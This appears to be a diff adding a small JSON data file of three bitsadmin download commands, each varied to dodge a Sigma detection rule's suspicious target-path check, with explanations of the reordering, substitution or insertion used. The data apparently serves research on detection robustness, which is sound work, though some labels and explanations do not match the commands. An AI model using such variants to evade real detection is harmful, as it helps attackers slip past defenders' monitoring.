@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Windows\\System32\bitsadmin.exe /transfer TestJob /download /priority foreground http://example.com/test.txt C:\\Lab\\out\\archive.7z",
+    "explanation": "Reordering: The target path is changed to a lab placeholder, avoiding the suspicious 'C:\\Temp\\' folder, which may not trigger the Sigma rule's parent process location check."
+  },
+  {
+    "output": "C:\\Windows\\System32\bitsadmin.exe /transfer TestJob /download /priority foreground http://example.com/test.txt C:\\Lab\\input\\sample.txt",
+    "explanation": "Substitution: Replaced the suspicious 'C:\\Temp\\test.txt' with a lab placeholder 'C:\\Lab\\input\\sample.txt' to avoid matching the Sigma rule's suspicious target path."
+  },
+  {
+    "output": "C:\\Windows\\System32\bitsadmin.exe /transfer TestJob /download /priority foreground http://example.com/test.txt C:\\Lab\\input\\sample.log",
+    "explanation": "Insertion: Replaced the suspicious 'C:\\Temp\\test.txt' with a lab placeholder 'C:\\Lab\\input\\sample.log' to avoid matching the Sigma rule's suspicious target path."
+  }
+]
